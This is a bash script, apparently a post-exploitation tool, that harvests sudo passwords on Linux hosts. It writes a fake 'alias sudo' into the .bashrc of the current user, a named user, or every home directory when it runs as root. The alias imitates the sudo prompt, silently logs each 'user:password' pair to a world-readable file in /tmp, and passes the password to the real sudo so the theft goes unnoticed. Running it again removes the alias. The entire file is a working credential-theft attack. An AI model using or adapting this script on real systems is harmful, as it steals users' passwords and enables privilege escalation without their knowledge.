#!/bin/bash
# This script was developed to check harvesting credentials
# Version="version 1.0"
# Date of last modification : 22/07/2023
# @TH3xACE - BLAIS David

# Check if the current user is root

# $1 > Target


##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

who=$(whoami 2>/dev/null)

function checkexist()
{
 local tuser="$1"
 local ver="$2"

  if [ "$tuser" = "auser" ]; then
  chkalias=$(cat /home/*/.bashrc | grep -w "alias sudo")
  else
   chkalias=$(cat /home/$tuser/.bashrc | grep -w "alias sudo")
  fi

  if [ "$chkalias" ]; then
        echo -e "${BOLD}${RED}[-] Entry exists in .bashrc of $tuser ${RESET}"    
    
   case "$tuser" in
  #"root")
  #     sed -i '/^alias sudo=/d' /root/.bashrc 
  #     source /root/.bashrc
  #  ;;
  "auser")
   #    sed -i '/^alias sudo=/d' /root/.bashrc 
   #    source /root/.bashrc
    
          for dir in /home/*; do
           if [ -d "$dir" ]; then
          sed -i '/^alias sudo=/d' $dir/.bashrc 
          source $dir/.bashrc
          echo "$dir/.bashrc"
           fi
          done  
   ;;
    *)
        sed -i '/^alias sudo=/d' /home/$tuser/.bashrc 
         source /home/$tuser/.bashrc
   
   ;;
   esac
    #sed -i '/^alias sudo=/d' /home/$tuser/.bashrc 
    #source /home/$tuser/.bashrc

         echo -e "${BOLD}${BLUE}[+] Deleting entry in .bashrc of $tuser ${RESET}"
        
        if [ "$tuser" = "auser" ]; then
          for dir in /home/*; do
           if [ -d "$dir" ]; then
          chkcreate=$(cat $dir/.bashrc | grep -w "alias sudo")
           fi
          done 
  
        else
          chkcreate=$(cat /home/$tuser/.bashrc | grep -w "alias sudo")
        fi
        if [ "$chkcreate" ]; then
          echo -e "${BOLD}${RED}[+] The entry was not deleted! Try manually ${RESET}"
        else
          echo -e "${BOLD}${GREEN}[+] Entry successfully deleted!${RESET}"
        fi

else
   #echo -e "alias sudo='read -s -p Password: && echo -e "\n" && echo -e "$password" >>/tmp/$tuser.sk.log 2>/dev/null && chmod 777 /tmp/$tuser.sk.log && /usr/local/bin/sudo $@'" >> /home/$tuser/.bashrc
   #source /home/$tuser/.bashrc
   case "$tuser" in
  #"root")
  #     echo -e "alias sudo='read -s -p Password: && echo -e "\n" && echo -e "$password" >>/tmp/root.sk.log 2>/dev/null && chmod 777 /tmp/root.sk.log && /usr/local/bin/sudo $@'" >> /root/.bashrc
  #     source /root/.bashrc
  #  ;;
  "auser")
        #echo -e "alias sudo='read -s -p Password: && echo -e "\n" && echo -e "$password" >>/tmp/root.sk.log 2>/dev/null && chmod 777 /tmp/root.sk.log && /usr/local/bin/sudo $@'" >> /root/.bashrc
        #source /root/.bashrc
      
        for dir in /home/*; do
           if [ -d "$dir" ]; then
                 #  echo -e "alias sudo='read -s -p Password: && echo -e "\n" && echo -e "$password" \>\>/tmp/allu.sk.log && chmod 777 /tmp/allu.sk.log && $(which sudo) \$\@'" >> $dir/.bashrc
                 if [ "$ver" = "new" ]; then
                 # [sudo] password for $USER:
                #echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && echo -e \"\\n\" && read -s -r password && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) \$@'" >> $dir/.bashrc
                #echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) \$@'" >> $dir/.bashrc
                
                # no need to type password twice
                echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
                else
                # Password:
                echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
 
                fi

             source $dir/.bashrc
             echo "$dir/.bashrc"
           fi
        done
    ;;
  *)         
  if [ "$ver" = "new" ]; then
     # [sudo] password for $USER:
     echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
     
     source /home/$tuser/.bashrc
   else
     # Password:
     echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
     source /home/$tuser/.bashrc
  fi
  sleep 0.05
  source /home/$tuser/.bashrc         
   ;;
   esac
   
        echo -e "${BOLD}${BLUE}[+] Creating entry in .bashrc of $who ${RESET}"  
         if [ "$tuser" = "auser" ]; then
          for dir in /home/*; do
           if [ -d "$dir" ]; then
          chkcreate=$(cat $dir/.bashrc | grep -w "alias sudo")
           fi
          done 

         else
          chkcreate=$(cat /home/$tuser/.bashrc | grep -w "alias sudo")
         fi
         
          if [ "$chkcreate" ]; then
          echo -e "${BOLD}${GREEN}[+] Entry successfully created! ${RESET}"
                else
          echo -e "${BOLD}${RED}[+] The entry was not created! Try manually ${RESET}"
        fi
  fi
}

case "$1" in
  #"root")
  #  echo -e "[+] ${BOLD}${YELLOW}Starting Cred Harvesting for root ${RESET}"
  #   if [ "$(id -u)" -eq 0 ]; then
  #      echo "You are running as root."
  #     checkexist "root"
  #  else
  #      echo "You are not running as root."
  #  fi
 
   # ;;
  "cuser")
    echo -e "[+] ${BOLD}${YELLOW}Starting Cred Harvesting for $who ${RESET}"
    checkexist "$who" "$2"
    ;;
  "auser")
    echo -e "[+] ${BOLD}${YELLOW}Starting Cred Harvesting for all users ${RESET} ${BOLD}${GREEN}[Need root access] ${RESET}"
    if [ "$(id -u)" -eq 0 ]; then
        echo "You are running as root."
        checkexist "auser" "$2"
    else
        echo "You are not running as root."
    fi
    ;;

    "$1")
    echo -e "[+] ${BOLD}${YELLOW}Starting Cred Harvesting for $1 ${RESET} ${BOLD}${GREEN}[Need root access] ${RESET}"
    if [ "$(id -u)" -eq 0 ]; then
        echo "You are running as root."
        checkexist "$1" "$2"
    else
        echo "You are not running as root."
    fi

    ;;

    *)
    echo "Unknown input. Please provide 'root' or 'cuser' or 'auser' as the argument."
    ;;
esac
